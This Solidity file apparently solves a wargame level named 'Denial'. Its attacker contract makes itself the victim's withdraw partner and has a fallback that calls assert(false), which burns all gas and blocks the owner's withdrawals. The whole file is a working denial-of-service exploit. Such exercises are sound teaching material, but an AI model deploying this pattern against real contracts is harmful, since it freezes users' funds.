// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Denial {
    function setWithdrawPartner(address) public {}
    function withdraw() public {}
}

contract HackDenial {

    Denial originalContract = Denial(0x5957AbDbcD96Db8d01010B87996e607b47e0A5Bf);

    function setPartner() public {
        originalContract.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        assert(false);
    }
}